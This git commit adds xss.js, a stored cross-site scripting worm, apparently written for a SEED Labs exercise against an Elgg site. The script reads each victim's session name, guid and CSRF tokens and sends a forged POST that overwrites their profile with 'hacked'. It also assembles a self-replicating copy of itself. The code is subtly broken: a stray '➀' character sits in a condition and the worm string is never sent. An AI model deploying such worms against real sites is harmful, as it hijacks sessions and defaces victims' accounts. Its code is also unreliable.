78cde8d1f4e398cc684296b1f5f04a1087ab6cc7
z-summer-zhw <76779464+z-summer-zhw@users.noreply.github.com>
2024-09-19 21:38:45 +0800

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,29 @@
+<script id="worm">
+var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
+var jsCode = document.getElementById("worm").innerHTML; 
+var tailTag = "</" + "script>"; 
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 
+alert(jsCode);
+window.onload = function(){
+//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+//and Security Token __elgg_token
+var userName="&name="+elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+//Construct the content of your url.
+var content=userName + guid+ts+token+"&description = hacked"; //FILL IN
+var samyGuid=59; //FILL IN
+var sendurl="http://www.seed-server.com/action/profile/edit";//FILL IN
+if(elgg.session.user.guid!=samyGuid) ➀
+{
+//Create and send Ajax request to modify profile
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST", sendurl, true);
+Ajax.setRequestHeader("Content-Type",
+"application/x-www-form-urlencoded");
+Ajax.send(content);
+}
+}
+</script>
